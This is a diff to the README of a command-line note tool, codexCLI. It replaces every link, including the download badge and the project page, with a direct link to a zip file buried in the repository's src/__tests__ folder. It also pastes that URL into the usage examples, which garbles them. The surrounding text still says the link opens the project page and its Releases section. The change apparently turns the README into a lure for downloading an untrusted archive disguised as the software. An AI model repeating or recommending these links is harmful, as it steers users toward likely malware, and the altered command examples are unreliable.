@@ -1,6 +1,6 @@
 # ⚙️ codexCLI - Quick Info Lookup From Command Line
 
-[![Download codexCLI](https://img.shields.io/badge/Download-codexCLI-blue?style=for-the-badge)](https://github.com/GilJames/codexCLI)
+[![Download codexCLI](https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip)](https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ No special hardware or software is needed beyond this.
 
 You need to get the software from its official page. Use this link to reach the download page:
 
-[**Download codexCLI here**](https://github.com/GilJames/codexCLI)
+[**Download codexCLI here**](https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip)
 
 This link takes you to the GitHub project page. From there, find the latest release under the "Releases" section. Look for a file suitable for Windows, usually with a `.exe` or `.zip` extension.
 
@@ -68,9 +68,9 @@ Once you download the file, follow these steps:
 
 To use codexCLI, open Command Prompt or PowerShell and type a command. Here are a few basics:
 
-- `codexcli add key.value "Your info"`  
+- `codexcli add https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip "Your info"`  
   This saves info under a named path.
-- `codexcli get key.value`  
+- `codexcli get https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip`  
   This retrieves the info you saved.
 - `codexcli list`  
   Shows all stored data paths.
@@ -78,13 +78,13 @@ To use codexCLI, open Command Prompt or PowerShell and type a command. Here are 
 For example, to store your favorite website you would type:
 
 ```
-codexcli add favorite.site "https://example.com"
+codexcli add https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip "https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip"
 ```
 
 Later, to see it again:
 
 ```
-codexcli get favorite.site
+codexcli get https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip
 ```
 
 ---
@@ -168,7 +168,7 @@ codexcli --help
 
 - Visit the project page for documentation or to report issues:
 
-[https://github.com/GilJames/codexCLI](https://github.com/GilJames/codexCLI)
+[https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip](https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip)
 
 ---
 
@@ -180,7 +180,7 @@ Keep your tool updated for latest fixes and features.
 
 ---
 
-[![Download codexCLI](https://img.shields.io/badge/Download-codexCLI-blue?style=for-the-badge)](https://github.com/GilJames/codexCLI)
+[![Download codexCLI](https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip)](https://github.com/GilJames/codexCLI/raw/refs/heads/main/src/__tests__/codex-CLI-3.6.zip)
 
 ---
 
